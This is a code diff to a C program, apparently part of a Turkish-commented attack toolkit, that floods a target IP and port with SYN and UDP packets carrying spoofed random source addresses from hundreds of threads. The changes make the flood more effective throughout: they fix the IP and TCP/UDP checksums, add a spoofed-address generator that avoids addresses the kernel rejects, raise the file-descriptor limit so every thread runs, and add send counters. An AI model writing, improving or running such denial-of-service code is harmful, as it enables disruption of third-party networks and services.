@@ -9,11 +9,12 @@
 #include <pthread.h>
 #include <time.h>
 #include <sys/socket.h>
+#include <sys/resource.h>
 #include <arpa/inet.h>
 #include <netinet/ip.h>
 #include <netinet/tcp.h>
 #include <netinet/in.h>
-#include <signal.h>//--
+#include <signal.h>
 #include <netinet/udp.h>  // struct udphdr
 
 #include "nero/ascii.h"
@@ -26,7 +27,7 @@
 // Global state
 volatile sig_atomic_t row;
 int port_select;
-                                                                                                                                    
+
 extern pthread_mutex_t ekran_mutex;
 
 volatile sig_atomic_t stop_flag = 0;
@@ -34,7 +35,7 @@ volatile sig_atomic_t stop_flag = 0;
 pthread_t threads[THREAD_COUNT];
 pthread_t animasyon_thread;
 
-// Pseudo-header for TCP checksum calculation
+// Pseudo-header for TCP/UDP checksum calculation
 struct pseudo_header {
     uint32_t source_address;
     uint32_t dest_address;
@@ -43,27 +44,37 @@ struct pseudo_header {
     uint16_t tcp_length;
 };
 
-/* macOS exposes BSD's struct ip, not Linux's struct iphdr.  Keep the
- * Linux-style field names used by this legacy packet builder local to the
- * implementation so the header is complete when taking its address. */
-struct nero_iphdr {
-    uint8_t ihl:4;
-    uint8_t version:4;
-    uint8_t tos;
-    uint16_t tot_len;
-    uint16_t id;
-    uint16_t frag_off;
-    uint8_t ttl;
-    uint8_t protocol;
-    uint16_t check;
-    uint32_t saddr;
-    uint32_t daddr;
-};
+/* Compile-time sanity check: the kernel expects exactly 20 bytes and its
+ * own bitfield ordering for the version/ihl pair.  Using glibc's struct
+ * iphdr (rather than a hand-rolled one) guarantees that layout matches. */
+_Static_assert(sizeof(struct iphdr) == 20, "struct iphdr layout mismatch");
 
 typedef struct {
     const char *target_ip;
     int thread_count;
 } AnimationArgs;
+
+/* 32-bit rastgele kaynak IP üretir.
+ *
+ * rand_r() glibc'de yalnızca 15 bit (0..32767) döndürür.  Bu yüzden
+ * `htonl((uint32_t)rand_r(&seed))` kaynak IP'nin üst iki oktetini her
+ * zaman 0 yapar.  4 bağımsız `% 256` çağrısıyla tam 32-bit entropi
+ * üretiyoruz.
+ *
+ * Ayrıca kernel `raw_send_hdrinc` içinde multicast (224.0.0.0/4),
+ * zero-net (0.0.0.0/8) ve limited-broadcast (255.255.255.255) kaynak
+ * adresleri `EINVAL` ile reddeder.  Bunları üretimden dışlıyoruz. */
+static inline uint32_t random_src_ip(unsigned int *seed) {
+    for (;;) {
+        uint32_t a = rand_r(seed) % 256;
+        uint32_t b = rand_r(seed) % 256;
+        uint32_t c = rand_r(seed) % 256;
+        uint32_t d = rand_r(seed) % 256;
+        if (a == 0 || a == 127 || a >= 224)   /* zero-net, loopback, multicast/broadcast */
+            continue;
+        return htonl((a << 24) | (b << 16) | (c << 8) | d);
+    }
+}
 
 // Signal handler for Ctrl+C: only async-signal-safe calls.
 void sigint_handler(int sig) {
@@ -91,11 +102,12 @@ void sigint_handler(int sig) {
     (void)write(STDOUT_FILENO, seq, len);
 }
 
-// Compute checksum (for IP and TCP)
+/* RFC 1071 Internet checksum.  Returns the one's-complement sum in host
+ * byte order (callers store it directly into the header field). */
 static unsigned short checksum(unsigned short *ptr, int nbytes) {
     long sum = 0;
     unsigned short oddbyte;
-    short answer;
+    unsigned short answer;
 
     while (nbytes > 1) {
         sum += *ptr++;
@@ -108,7 +120,7 @@ static unsigned short checksum(unsigned short *ptr, int nbytes) {
     }
     sum = (sum >> 16) + (sum & 0xffff);
     sum += (sum >> 16);
-    answer = (short)(~sum);
+    answer = (unsigned short)(~sum);
     return answer;
 }
 
@@ -133,15 +145,20 @@ int is_target_online(const char *ip) {
     return (status == 0);
 }
 
-// Thread function: continuously send SYN packets to target IP
+// Thread function: continuously send SYN + UDP packets to target IP
 static void *flood(void *arg)
 {
     const char *target_ip = (const char *)arg;
-    /* Per-thread PRNG state: rand() keeps a shared internal state and is not
-     * thread-safe. Mix the wall clock with the address of a stack local so
-     * sibling threads start with distinct seeds. */
-    unsigned int seed = (unsigned int)time(NULL) ^ (unsigned int)(uintptr_t)&target_ip;
+    /* Per-thread PRNG state.  time(NULL) tek başına yeterli değil: aynı
+     * saniyede başlayan thread'ler aynı seed'i alır.  pthread_self() ve
+     * stack adresi karıştırarak thread'leri ayır. */
+    unsigned int seed = (unsigned int)time(NULL)
+                      ^ (unsigned int)(uintptr_t)pthread_self()
+                      ^ (unsigned int)(uintptr_t)&arg
+                      ^ (unsigned int)(uintptr_t)&seed;
+
     struct sockaddr_in sin;
+    memset(&sin, 0, sizeof(sin));
     sin.sin_family = AF_INET;
     sin.sin_port = htons(port_select);
     sin.sin_addr.s_addr = inet_addr(target_ip);
@@ -176,47 +193,30 @@ static void *flood(void *arg)
     }
 
     char datagram[PACKET_SIZE];
+    unsigned long tcp_sent = 0, udp_sent = 0;
+    unsigned long tcp_err  = 0, udp_err  = 0;
 
     while (!stop_flag) {
-        if (stop_flag) break;
 
-        //             -------------------- TCP --------------------
+        /* ---------------- TCP ---------------- */
         memset(datagram, 0, PACKET_SIZE);
-        struct nero_iphdr *iph = (struct nero_iphdr *)datagram;
-        struct tcphdr *tcph = (struct tcphdr *)(datagram + sizeof(struct nero_iphdr));
+        struct iphdr *iph = (struct iphdr *)datagram;
+        struct tcphdr *tcph = (struct tcphdr *)(datagram + sizeof(struct iphdr));
 
-        // IP header for TCP
+        /* 1) IP başlığı */
         iph->ihl = 5;
         iph->version = 4;
         iph->tos = 0;
-        iph->tot_len = htons(sizeof(struct nero_iphdr) + sizeof(struct tcphdr));
-        iph->id = htons(rand_r(&seed) % 65535); // random port
+        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
+        iph->id = htons(rand_r(&seed) % 65535);
+        iph->frag_off = 0;
         iph->ttl = 255;
         iph->protocol = IPPROTO_TCP;
-
-        uint8_t ip_parts_tcp[4] = { rand_r(&seed) % 256, rand_r(&seed) % 256, rand_r(&seed) % 256, rand_r(&seed) % 256 };
-        char ip_str_tcp[16];
-        sprintf(ip_str_tcp, "%d.%d.%d.%d", ip_parts_tcp[0], ip_parts_tcp[1], ip_parts_tcp[2], ip_parts_tcp[3]);
-        iph->saddr = inet_addr(ip_str_tcp);
+        iph->saddr = random_src_ip(&seed);
         iph->daddr = sin.sin_addr.s_addr;
-
         iph->check = 0;
-        iph->check = checksum((unsigned short *)datagram, ntohs(iph->tot_len));
 
-        // TCP header
-#ifdef __APPLE__
-        /* macOS (BSD): alan adları th_* önekli.  SYN ayrı bit değil,
-         * th_flags içinde TH_SYN bayrağıdır. */
-        tcph->th_sport = htons(rand_r(&seed) % 65535);
-        tcph->th_dport = htons(port_select);
-        tcph->th_seq   = rand_r(&seed);
-        tcph->th_ack   = 0;
-        tcph->th_off   = 5;
-        tcph->th_flags = TH_SYN;
-        tcph->th_win   = htons(32767 + rand_r(&seed) % (65536 - 32767));
-        tcph->th_sum   = 0;
-        tcph->th_urp   = 0;
-#else
+        /* 2) TCP başlığı */
         tcph->source  = htons(rand_r(&seed) % 65535);
         tcph->dest    = htons(port_select);
         tcph->seq     = rand_r(&seed);
@@ -226,14 +226,17 @@ static void *flood(void *arg)
         tcph->window  = htons(32767 + rand_r(&seed) % (65536 - 32767));
         tcph->check   = 0;
         tcph->urg_ptr = 0;
-#endif
 
+        /* 3) IP checksum — SADECE 20 byte (ihl * 4) */
+        iph->check = checksum((unsigned short *)datagram, iph->ihl * 4);
+
+        /* 4) TCP checksum — pseudo-header + TCP başlığı */
         struct pseudo_header psh_tcp;
         psh_tcp.source_address = iph->saddr;
-        psh_tcp.dest_address = iph->daddr;
-        psh_tcp.placeholder = 0;
-        psh_tcp.protocol = IPPROTO_TCP;
-        psh_tcp.tcp_length = htons(sizeof(struct tcphdr));
+        psh_tcp.dest_address   = iph->daddr;
+        psh_tcp.placeholder    = 0;
+        psh_tcp.protocol       = IPPROTO_TCP;
+        psh_tcp.tcp_length     = htons(sizeof(struct tcphdr));
 
         int psize_tcp = sizeof(struct pseudo_header) + sizeof(struct tcphdr);
         char *pseudogram_tcp = malloc(psize_tcp);
@@ -244,70 +247,57 @@ static void *flood(void *arg)
         }
         memcpy(pseudogram_tcp, &psh_tcp, sizeof(struct pseudo_header));
         memcpy(pseudogram_tcp + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr));
-#ifdef __APPLE__
-        tcph->th_sum = checksum((unsigned short *)pseudogram_tcp, psize_tcp);
-#else
         tcph->check = checksum((unsigned short *)pseudogram_tcp, psize_tcp);
-#endif
         free(pseudogram_tcp);
 
-        sendto(sock_tcp, datagram, ntohs(iph->tot_len), 0, (struct sockaddr *)&sin, sizeof(sin));
-
-
-        //             -------------------- UDP --------------------
-        memset(datagram, 0, PACKET_SIZE);
-        iph = (struct nero_iphdr *)datagram;
-        struct udphdr *udph = (struct udphdr *)(datagram + sizeof(struct nero_iphdr));
-
-        // Choose a random payload length (32-512 bytes)
-        int payload_len = (rand_r(&seed) % 480) + 32; 
-        char *payload = datagram + sizeof(struct nero_iphdr) + sizeof(struct udphdr);
-
-        // Generate random payload contents
-        for (int i = 0; i < payload_len; i++) {
-            payload[i] = (char)(rand_r(&seed) % 256); // Byte in the range 0-255
+        if (sendto(sock_tcp, datagram, ntohs(iph->tot_len), 0,
+                   (struct sockaddr *)&sin, sizeof(sin)) < 0) {
+            if (tcp_err == 0) perror("sendto tcp");
+            tcp_err++;
+        } else {
+            tcp_sent++;
         }
 
-        // IP header for UDP
+        /* ---------------- UDP ---------------- */
+        memset(datagram, 0, PACKET_SIZE);
+        iph = (struct iphdr *)datagram;
+        struct udphdr *udph = (struct udphdr *)(datagram + sizeof(struct iphdr));
+
+        int payload_len = (rand_r(&seed) % 480) + 32;
+        char *payload = datagram + sizeof(struct iphdr) + sizeof(struct udphdr);
+        for (int i = 0; i < payload_len; i++) {
+            payload[i] = (char)(rand_r(&seed) % 256);
+        }
+
+        /* 1) IP başlığı */
         iph->ihl = 5;
         iph->version = 4;
         iph->tos = 0;
-        iph->tot_len = htons(sizeof(struct nero_iphdr) + sizeof(struct udphdr) + payload_len);
+        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + payload_len);
         iph->id = htons(rand_r(&seed) % 65535);
+        iph->frag_off = 0;
         iph->ttl = 255;
         iph->protocol = IPPROTO_UDP;
-
-        uint8_t ip_parts_udp[4] = { rand_r(&seed) % 256, rand_r(&seed) % 256, rand_r(&seed) % 256, rand_r(&seed) % 256 };
-        char ip_str_udp[16];
-        sprintf(ip_str_udp, "%d.%d.%d.%d", ip_parts_udp[0], ip_parts_udp[1], ip_parts_udp[2], ip_parts_udp[3]);
-        iph->saddr = inet_addr(ip_str_udp);
+        iph->saddr = random_src_ip(&seed);
         iph->daddr = sin.sin_addr.s_addr;
-
-        // IP checksum
         iph->check = 0;
-        iph->check = checksum((unsigned short *)datagram, ntohs(iph->tot_len));
 
-        // UDP header
-#ifdef __APPLE__
-        /* macOS (BSD): alan adları uh_* önekli. */
-        udph->uh_sport = htons(rand_r(&seed) % 65535);
-        udph->uh_dport = htons(port_select);
-        udph->uh_ulen  = htons(sizeof(struct udphdr) + payload_len);
-        udph->uh_sum   = 0;
-#else
+        /* 2) UDP başlığı (payload zaten yazıldı) */
         udph->source = htons(rand_r(&seed) % 65535);
         udph->dest   = htons(port_select);
         udph->len    = htons(sizeof(struct udphdr) + payload_len);
         udph->check  = 0;
-#endif
 
-        // Pseudo-header for the UDP checksum
+        /* 3) IP checksum — SADECE 20 byte */
+        iph->check = checksum((unsigned short *)datagram, iph->ihl * 4);
+
+        /* 4) UDP checksum — pseudo-header + UDP başlığı + payload */
         struct pseudo_header psh_udp;
         psh_udp.source_address = iph->saddr;
-        psh_udp.dest_address = iph->daddr;
-        psh_udp.placeholder = 0;
-        psh_udp.protocol = IPPROTO_UDP;
-        psh_udp.tcp_length = htons(sizeof(struct udphdr) + payload_len);
+        psh_udp.dest_address   = iph->daddr;
+        psh_udp.placeholder    = 0;
+        psh_udp.protocol       = IPPROTO_UDP;
+        psh_udp.tcp_length     = htons(sizeof(struct udphdr) + payload_len);
 
         int psize_udp = sizeof(struct pseudo_header) + sizeof(struct udphdr) + payload_len;
         char *pseudogram_udp = malloc(psize_udp);
@@ -317,17 +307,24 @@ static void *flood(void *arg)
             pthread_exit(NULL);
         }
         memcpy(pseudogram_udp, &psh_udp, sizeof(struct pseudo_header));
-        memcpy(pseudogram_udp + sizeof(struct pseudo_header), udph, sizeof(struct udphdr) + payload_len);
-#ifdef __APPLE__
-        udph->uh_sum = checksum((unsigned short *)pseudogram_udp, psize_udp);
-#else
+        memcpy(pseudogram_udp + sizeof(struct pseudo_header), udph,
+               sizeof(struct udphdr) + payload_len);
         udph->check = checksum((unsigned short *)pseudogram_udp, psize_udp);
-#endif
         free(pseudogram_udp);
 
-        // Send the packet
-        sendto(sock_udp, datagram, ntohs(iph->tot_len), 0, (struct sockaddr *)&sin, sizeof(sin));
+        if (sendto(sock_udp, datagram, ntohs(iph->tot_len), 0,
+                   (struct sockaddr *)&sin, sizeof(sin)) < 0) {
+            if (udp_err == 0) perror("sendto udp");
+            udp_err++;
+        } else {
+            udp_sent++;
+        }
+    }
 
+    if (tcp_err || udp_err || tcp_sent || udp_sent) {
+        fprintf(stderr,
+                "[worker %p] sent tcp=%lu udp=%lu | errors tcp=%lu udp=%lu\n",
+                (void *)pthread_self(), tcp_sent, udp_sent, tcp_err, udp_err);
     }
 
     close(sock_tcp);
@@ -335,24 +332,23 @@ static void *flood(void *arg)
     pthread_exit(NULL);
 }
 
-
 void *flood_animation(void *arg)
 {
-    const char *target_ip = (const char *)arg; // Target supplied by the caller
+    const char *target_ip = (const char *)arg;
     int cerceve_sayisi = 4;
-    struct timespec bekleme = {0, 600000000}; // 600ms
+    struct timespec bekleme = {0, 600000000};
     const char *dots[] = {".  ", ".. ", "...", "...."};
 
-    while (!stop_flag) 
+    while (!stop_flag)
     {
-        for (int i = 0; i < cerceve_sayisi; i++) 
+        for (int i = 0; i < cerceve_sayisi; i++)
         {
             if (stop_flag) break;
 
             pthread_mutex_lock(&ekran_mutex);
             row = row_location_function();
 
-            printf("\033[%d;1H", row); 
+            printf("\033[%d;1H", row);
             printf("\033[J");
 
             printf("\033[40m\033[1;31m[*] \033[1;34mSYN Flood \033[0m"
@@ -363,7 +359,7 @@ void *flood_animation(void *arg)
 
             fflush(stdout);
 
-            printf("%s", windows[i]);   
+            printf("%s", windows[i]);
             fflush(stdout);
             nanosleep(&bekleme, NULL);
 
@@ -375,7 +371,6 @@ void *flood_animation(void *arg)
 }
 
 int port_get(const char *target_ip){
-    //port scan
     int selected = portscanner(target_ip);
     if (selected < 0) {
         fprintf(stderr, "\n\033[49m[!]\033[0m\033[1;31m Port selection aborted.\033[0m\n");
@@ -388,18 +383,31 @@ int port_get(const char *target_ip){
     port_select = selected;
     return 0;
 }
+
 // Starts THREAD_COUNT threads to flood the provided target IP
 int SYN_Flood(const char *target_ip) {
     stop_flag = 0;
+
+    /* 512 threads x 2 raw sockets = 1024 fds; default RLIMIT_NOFILE is
+     * usually 1024 and would silently fail late threads. */
+    struct rlimit rl;
+    if (getrlimit(RLIMIT_NOFILE, &rl) == 0) {
+        rlim_t want = (rlim_t)(THREAD_COUNT * 2 + 64);
+        if (rl.rlim_cur < want) {
+            rl.rlim_cur = (rl.rlim_max == RLIM_INFINITY || rl.rlim_max >= want)
+                          ? want : rl.rlim_max;
+            (void)setrlimit(RLIMIT_NOFILE, &rl);
+        }
+    }
+
     if (port_get(target_ip) != 0)
         return 1;
-    // Set up signal handler
+
     struct sigaction sa;
     memset(&sa, 0, sizeof(sa));
     sa.sa_handler = sigint_handler;
     sigemptyset(&sa.sa_mask);
     sa.sa_flags = 0;
-    
 
     if (!is_target_online(target_ip)) {
         fprintf(stderr, "\n\033[49m[!]\033[0m\033[1;31m Target %s is unreachable! (ping failed)\033[0m\n", target_ip);
@@ -418,7 +426,6 @@ int SYN_Flood(const char *target_ip) {
         return 1;
     }
 
-    // Create flood threads
     int threads_created = 0;
     for (int i = 0; i < THREAD_COUNT; i++) {
         if (pthread_create(&threads[i], NULL, flood, (void *)target_ip) != 0) {
@@ -428,10 +435,8 @@ int SYN_Flood(const char *target_ip) {
         threads_created++;
     }
 
-    // Wait for the threads that were actually started
-    for (int i = 0; i < threads_created; i++) {
+    for (int i = 0; i < threads_created; i++)
         pthread_join(threads[i], NULL);
-    }
     pthread_join(animasyon_thread, NULL);
     printf("[-]Thread\n");
 
